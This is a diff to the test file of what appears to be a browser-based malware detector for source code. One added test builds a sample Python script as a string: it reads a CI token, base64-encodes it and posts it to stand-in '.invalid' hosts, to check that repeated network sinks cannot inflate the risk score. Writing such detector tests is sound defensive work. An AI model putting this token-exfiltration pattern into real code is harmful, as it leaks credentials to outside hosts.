@@ -9,6 +9,7 @@ import {
   installFullModel,
   MAX_SOURCE_BYTES,
   predictMicro,
+  predictMicroDetails,
 } from "../engine.mjs";
 
 const initialStatus = getFullModelStatus();
@@ -35,6 +36,7 @@ test("engine import does not eagerly load model weights", () => {
   assert.equal(initialStatus.loaded, false);
   assert.equal(initialStatus.binaryBytes, 0);
   assert.equal(unloadedReport.model.loaded, false);
+  assert.equal(unloadedReport.model.consulted, false);
   assert.equal(unloadedReport.model.used, false);
   assert.equal(unloadedReport.model.metadata, null);
   assert.match(unloadedPredictionError.message, /Download the full µMal model/);
@@ -76,12 +78,27 @@ test("browser inference matches PyTorch smoke vectors", () => {
   }
 });
 
+test("windowed browser inference evaluates tokens beyond one context", () => {
+  const tokens = Array.from({ length: 300 }, (_, index) => `TOKEN:${index}`);
+  const result = predictMicroDetails(tokens);
+
+  assert.equal(result.windows, 2);
+  assert.equal(result.tokensEvaluated, tokens.length);
+  assert.equal(result.truncated, false);
+  assert.ok(result.probability >= 0 && result.probability <= 1);
+});
+
+
 test("benign demo remains low signal", () => {
   const report = analyzeSource(DEMO_SOURCES.benign, "benign.py");
   assert.equal(report.assessment, "no-malware-evidence");
   assert.equal(report.verdict, "low-signal");
   assert.equal(report.model.loaded, true);
+  assert.equal(report.model.consulted, true);
   assert.equal(report.model.used, false);
+  assert.equal(report.model.gate, "below");
+  assert.equal(typeof report.model.probability, "number");
+  assert.equal(report.riskScore, report.ruleScore);
 });
 
 test("exfiltration demo produces line evidence and uses full µMal", () => {
@@ -104,6 +121,40 @@ test("exfiltration demo produces line evidence and uses full µMal", () => {
   assert.equal(path.score, 2);
   assert.ok(report.evidence.every((item) => item.line > 0));
 });
+
+test("repeated URL sinks cannot inflate score or flood µMal input", () => {
+  const prefix = `import base64
+import os
+import requests as http
+
+def collect():
+    token = os.getenv("CI_TOKEN")
+    packed = base64.b64encode(token.encode())
+`;
+  const calls = Array.from(
+    { length: 20 },
+    (_, index) =>
+      `    http.post("https://collector${index || ""}.invalid/collect", data=packed)`,
+  );
+  calls[0] =
+    `    http.post("https://example.invalid/collect", data=packed)`;
+  const spammed = analyzeSource(prefix + calls.join("\n") + "\n", "exfil.py");
+  const single = analyzeSource(DEMO_SOURCES.suspicious, "exfil.py");
+
+  assert.equal(spammed.ruleScore, 28);
+  assert.equal(spammed.ruleScore, single.ruleScore);
+  assert.equal(spammed.riskScore, single.riskScore);
+  assert.deepEqual(spammed.modelTokens, single.modelTokens);
+  assert.equal(spammed.model.consulted, true);
+  assert.equal(spammed.model.used, true);
+  assert.ok(spammed.model.suppressedTokens > 0);
+  assert.ok(spammed.suppressedEvidenceCount > 0);
+  assert.equal(
+    spammed.evidence.find((item) => item.op === "NETWORK_SEND").occurrences,
+    20,
+  );
+});
+
 
 test("download and dynamic execution create reviewable paths", () => {
   const report = analyzeSource(DEMO_SOURCES.download, "stage.py");
